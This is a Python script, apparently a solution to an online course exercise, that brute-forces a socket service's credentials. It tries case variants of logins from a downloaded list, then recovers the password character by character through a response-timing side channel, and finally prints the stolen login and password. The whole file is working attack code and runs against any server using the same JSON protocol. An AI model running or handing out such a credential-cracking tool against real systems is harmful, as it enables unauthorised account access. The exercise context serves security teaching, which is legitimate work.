import sys
import socket
from itertools import product
import requests
import json
import string
from datetime import datetime

#common_pw = requests.get('https://stepik.org/media/attachments/lesson/255258/passwords.txt').text.split('\r\n')
admin_logins = requests.get('https://stepik.org/media/attachments/lesson/255258/logins.txt').text.split('\r\n')
# remove the '' option since it won't be valid
admin_logins.remove('')
# remove duplicates like 'Admin' and 'admin' since we're checking all case combinations
admin_logins = sorted(list(set([string_.lower() for string_ in admin_logins])))

alpha_nums = list(string.ascii_letters + string.digits)

args = sys.argv
HOST, PORT = args[1], int(args[2])
ADDRESS = (HOST, PORT)


class Connection:

    def __init__(self, address):
        self.address = address
        self.conn = socket.socket()
        self.conn.connect(address)  # connect to address when class instance is created
        self.login = ''
        self.password = ''
        self.active = True
        self.main()

    def __repr__(self):
        return f"socket connection to {str(self.address)} with login: {self.login} and password: {self.password}"

    def hack_login(self, phrases):
        """
        Tries Cartesian product of sets for each in the list of input phrases,
        where sets are the upper and lower case instances of a letter if a letter
        or the digit if a digit for each character in the phrase
        """
        for phrase in phrases:
            # e.g. if the input is '123', we get ['1', '2', '3'], since numbers have no case;
            # if the input is 'hat12', we get [['H', 'h'], ['A', 'a'], ['T', 't'], '1', '2']
            case_options = []

            for char in phrase:
                if char.isalpha():
                    case_options.append([char.upper(), char.lower()])
                else:
                    case_options.append(char)

            for p in product(*case_options):
                current_guess = ''.join(p)

                message = json.dumps({'login': current_guess, 'password': ' '}, indent=4)
                self.conn.send(message.encode())

                response = json.loads(self.conn.recv(1024).decode())['result']
                if response == 'Wrong login!':
                    pass
                elif response == 'Wrong password!':
                    self.login = current_guess
                    return current_guess

    def hack_password(self):
        # hack the password here
        current_guess = ''
        for _ in range(15):  # guess up until password is 15 characters long
            for char in alpha_nums:
                start = datetime.now()
                self.conn.send(json.dumps({'login': self.login, 'password': current_guess + char}).encode())
                response = json.loads(self.conn.recv(1024).decode())['result']
                finish = datetime.now()
                difference = (finish - start).microseconds
                if response == 'Wrong password!' and difference < 10000:
                    continue  # continue in the for loop w/ combinations of current_guess + character
                # exception vulnerability reveals time delay if current_guess + char == first char(s):
                elif response == 'Wrong password!' and difference > 10000:
                    current_guess += char
                    break  # break the loop and start a new loop w/ updated current_guess + character
                elif response == 'Connection success!':
                    current_guess += char
                    self.password = current_guess
                    return current_guess

    def close_conn(self):
        self.conn.close()
        self.active = False

    def main(self):
        self.hack_login(phrases=admin_logins)
        self.hack_password()

        print(json.dumps({'login': self.login, 'password': self.password}, indent=4))
        self.close_conn()
        exit()


Connection(address=ADDRESS)
